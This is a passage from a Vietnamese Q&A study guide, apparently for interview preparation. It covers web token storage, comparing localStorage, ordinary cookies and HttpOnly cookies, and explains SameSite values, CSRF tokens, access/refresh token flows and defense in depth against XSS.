│                                                              │
│  Lý do: XSS khó chống hơn CSRF — một innerHTML quên        │
│  escape là lỗ hổng XSS. HttpOnly Cookie chặn XSS steal     │
│  token, CSRF chỉ cần SameSite: Lax. Combo access + refresh │
│  cho UX seamless mà vẫn an toàn.                             │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q2: So sánh 3 cách lưu token? Cách nào an toàn nhất?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  ┌─────────────────┬───────────┬───────────┬─────────────┐  │
│  │                 │ XSS đọc?  │ CSRF gửi? │ Đánh giá     │  │
│  ├─────────────────┼───────────┼───────────┼─────────────┤  │
│  │ localStorage    │ ✅ Được   │ ❌ Không  │ ⚠️          │  │
│  │ Cookie thường   │ ✅ Được   │ ✅ Có     │ ❌ Tệ nhất  │  │
│  │ HttpOnly Cookie │ ❌ Không  │ ✅ Có     │ ⭐ Tốt nhất │  │
│  └─────────────────┴───────────┴───────────┴─────────────┘  │
│                                                              │
│  localStorage: tiện nhưng XSS đánh cắp được.                │
│  Cookie thường: lose-lose, bị cả XSS lẫn CSRF.             │
│  HttpOnly Cookie: JS không đọc được → XSS không steal.     │
│  CSRF dễ chặn bằng SameSite + CSRF Token.                   │
│                                                              │
│  → "Hai hại chọn bên nhẹ hơn" → HttpOnly Cookie            │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q3: Tại sao chống CSRF dễ hơn chống XSS?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  XSS: attack surface CỰC RỘNG:                              │
│  → user input, third-party scripts, rich text, CDN,         │
│    innerHTML, Markdown, JSON inject...                       │
│  → Code càng lớn → càng dễ bỏ sót → KHÔNG THỂ 100%        │
│                                                              │
│  CSRF: dễ chặn, CHUẨN HÓA:                                  │
│  → sameSite: 'lax' = 1 dòng config → chặn đa số           │
│  → CSRF Token nếu cần nghiêm ngặt hơn                      │
│  → Attack surface hẹp (chỉ form + link)                     │
│                                                              │
│  → Chặn XSS steal token (HttpOnly) trước                    │
│  → Rồi xử lý CSRF (dễ hơn RẤT NHIỀU)                      │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q4: SameSite cookie có mấy giá trị? Khác nhau thế nào?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  3 giá trị:                                                  │
│                                                              │
│  ┌───────────┬──────────────────────────────────────────┐   │
│  │ strict    │ Cross-site HOÀN TOÀN không gửi cookie   │   │
│  │           │ An toàn nhất, nhưng UX tệ               │   │
│  │           │ (external link vào → phải login lại)    │   │
│  ├───────────┼──────────────────────────────────────────┤   │
│  │ lax       │ GET navigation: gửi                      │   │
│  │ (default) │ POST cross-site: KHÔNG GỬI              │   │
│  │           │ Đủ cho đa số scenarios                   │   │
│  │           │ Chrome default từ 2020                   │   │
│  ├───────────┼──────────────────────────────────────────┤   │
│  │ none      │ Luôn gửi (cần secure: true)             │   │
│  │           │ Dùng cho cross-site intentional          │   │
│  │           │ (SSO, embedded widgets...)               │   │
│  └───────────┴──────────────────────────────────────────┘   │
│                                                              │
│  Recommendation: lax cho đa số, strict cho finance         │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q5: CSRF Token hoạt động thế nào? Tại sao attacker không giả được?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  Flow:                                                       │
│  ① Backend tạo random CSRF token                            │
│  ② Set vào cookie (KHÔNG httpOnly — frontend cần đọc)       │
│  ③ Frontend đọc cookie, gửi trong request HEADER            │
│  ④ Backend verify: cookie value === header value?           │
│                                                              │
│  Tại sao attacker không giả được:                            │
│  → Attacker CÓ THỂ làm browser TỰ GỬI cookie              │
│  → Nhưng KHÔNG THỂ ĐỌC nội dung cookie                     │
│    (Same-Origin Policy chặn cross-origin đọc cookie)        │
│  → Không đọc được → không construct được header             │
│  → Cookie value ≠ header value → 403 Forbidden             │
│                                                              │
│  Key insight: CSRF token exploit cùng 1 nguyên lý           │
│  → Browser TỰ GỬI cookie, nhưng cross-origin                │
│    KHÔNG CHO ĐỌC cookie                                     │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q6: Nếu bắt buộc dùng localStorage thì phải làm gì?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  4 biện pháp giảm thiểu rủi ro:                              │
│                                                              │
│  ① Nghiêm ngặt chống XSS:                                   │
│     → textContent thay innerHTML                            │
│     → Escape mọi user input                                │
│     → CSP header (script-src 'self')                        │
│     → DOMPurify cho rich text                               │
│                                                              │
│  ② Token hết hạn nhanh:                                      │
│     → Access token 15-30 phút                               │
│     → Refresh token trong HttpOnly Cookie                   │
│     → Bị đánh cắp access → chỉ dùng được ngắn hạn         │
│                                                              │
│  ③ Sensitive ops cần xác thực lại:                           │
│     → Chuyển tiền, đổi mật khẩu → nhập lại password/OTP   │
│                                                              │
│  ④ Giám sát bất thường:                                      │
│     → Multi-location login → alert                          │
│     → Token usage frequency anomaly → auto-revoke          │
│                                                              │
│  ⚠️ Đây chỉ là GIẢM THIỂU, không phải GIẢI QUYẾT          │
│  → Vẫn nên migrate sang HttpOnly Cookie khi có thể         │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q7: Dù dùng HttpOnly Cookie, XSS vẫn nguy hiểm không?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  CÓ — HttpOnly chặn ĐÁNH CẮP token, nhưng:                 │
│                                                              │
│  → XSS vẫn có thể GỬI REQUEST với session hiện tại         │
│    (browser tự attach HttpOnly cookie)                       │
│  → Attacker không STEAL token nhưng có thể USE session      │
│  → Ví dụ: XSS script gọi fetch('/api/transfer',            │
│    { credentials: 'include' }) → vẫn thành công!           │
│                                                              │
│  → Đó là lý do cần DEFENSE IN DEPTH:                        │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Layer 1:  HttpOnly Cookie (chặn steal token)       │   │
│  │  Layer 2:  SameSite (chặn CSRF)                      │   │
│  │  Layer 3:  CSP (chặn inject script)                  │   │
│  │  Layer 4:  Input validation (chặn XSS source)       │   │
│  │  Layer 5:  2FA cho sensitive ops                     │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                              │
│  → KHÔNG CÓ giải pháp 100% an toàn                          │
│  → Multiple layers = attacker phải vượt TẤT CẢ             │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q8: Access Token + Refresh Token hoạt động thế nào?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  Login → server trả 2 token:                                 │
│                                                              │
│  access_token (ngắn, 2h) → lưu MEMORY (JS var)             │
│  → Dùng cho business API requests                            │
│  → XSS steal? Chỉ valid 2h → risk controllable              │
│                                                              │
│  refresh_token (dài, 7d) → lưu HTTPONLY COOKIE              │
│  → CHỈ dùng exchange access_token mới                        │
│  → JS KHÔNG đọc được (HttpOnly)                              │
│  → CSRF dùng? Chỉ lấy được access_token mới                 │
│    nhưng token đó ở memory → attacker KHÔNG LẤY ĐƯỢC        │
│                                                              │
│  access_token hết hạn → frontend TỰ ĐỘNG gọi /api/refresh  │
│  → server trả access_token mới → lưu memory                 │
│  → User KHÔNG HỀ BIẾT! Seamless!                             │
│                                                              │
│  → Cân bằng hoàn hảo: BẢO MẬT + UX                          │
│  → Preferred cho modern SPA (React/Vue)                      │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Q9: Lưu token trong Memory thì refresh page mất token — giải quyết sao?

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  Đúng, memory storage mất khi refresh. Giải quyết:          │
│                                                              │
│  ① Refresh Token (HttpOnly Cookie) → lấy access_token mới  │
│     → App init gọi /api/refresh → nếu cookie valid          │
│       → server trả access_token → lưu memory                │
│     → User KHÔNG cần login lại!                              │
│                                                              │
│  ② Flow: Page load → check memory (empty) → auto call       │
│     /api/refresh → browser gửi HttpOnly cookie               │
│     → server verify → trả access_token → tiếp tục          │
│                                                              │
│  ③ UX: Hiển thị loading/splash screen trong lúc refresh     │
│     → Sau khi có token → render app                          │
│                                                              │
│  key: path: '/api/refresh' trên cookie → CHỈ gửi cho        │
│  refresh endpoint, giảm attack surface                       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```
